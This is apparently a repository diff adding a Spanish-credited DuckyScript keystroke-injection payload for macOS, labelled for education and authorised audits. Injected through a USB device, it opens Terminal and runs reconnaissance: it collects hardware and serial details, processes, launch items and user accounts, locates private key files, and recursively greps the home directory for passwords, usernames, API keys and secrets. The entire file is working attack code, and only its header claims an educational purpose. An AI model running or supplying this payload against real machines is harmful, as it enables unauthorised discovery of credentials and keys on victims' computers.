@@ -1,0 +1,56 @@
+REM ============================================================
+REM  Autor: eLDeSiempre
+REM  Web:   https://eldesiempre.es
+REM  Repo:  https://github.com/eLDeSiempre
+REM  Uso:   Educativo / auditoría autorizada
+REM ============================================================
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING clear
+ENTER
+DELAY 500
+STRING echo "Starting local system security testing and reconnaissance..."
+ENTER
+DELAY 1000
+STRING echo "----- System Information -----"
+ENTER
+STRING system_profiler SPHardwareDataType SPSoftwareDataType | grep -E "Model Identifier|Processor Name|Memory|Serial Number|OS Version" | sed 's/^\s*//'
+ENTER
+DELAY 1000
+STRING echo "----- Suspicious Processes -----"
+ENTER
+STRING ps aux | grep -E "root|admin" | grep -v grep | awk '{print $2, $11}'
+ENTER
+DELAY 1000
+STRING echo "----- Startup Items -----"
+ENTER
+STRING ls -la /Library/LaunchAgents /Library/LaunchDaemons ~/Library/LaunchAgents
+ENTER
+DELAY 1000
+STRING echo "----- User Accounts -----"
+ENTER
+STRING dscl . -list /Users | grep -v '_'
+ENTER
+DELAY 1000
+STRING echo "----- Sensitive Files -----"
+ENTER
+STRING find ~ -type f \( -iname "*.key" -o -iname "*.pem" -o -iname "*.rsa" \) 2>/dev/null
+ENTER
+DELAY 1000
+STRING echo "----- Sensitive Information -----"
+ENTER
+STRING grep -r -i -I --include='*.txt' --include='*.doc*' --include='*.xls*' --include='*.csv' --include='*.json' --include='*.xml' --include='*.conf' --include='*.config' --include='*.properties' --include='*.ini' --include='*.env' --exclude-dir='.git' --exclude-dir='node_modules' "password\|username\|apikey\|secret" ~ 2>/dev/null
+ENTER
+DELAY 1000
+STRING echo "----- Unsecured Files and Directories -----"
+ENTER
+STRING find ~ -type d \( -iname "public" -o -iname "www" \) 2>/dev/null
+ENTER
+DELAY 1000
+STRING echo "----- Security testing and reconnaissance completed! -----"
+ENTER
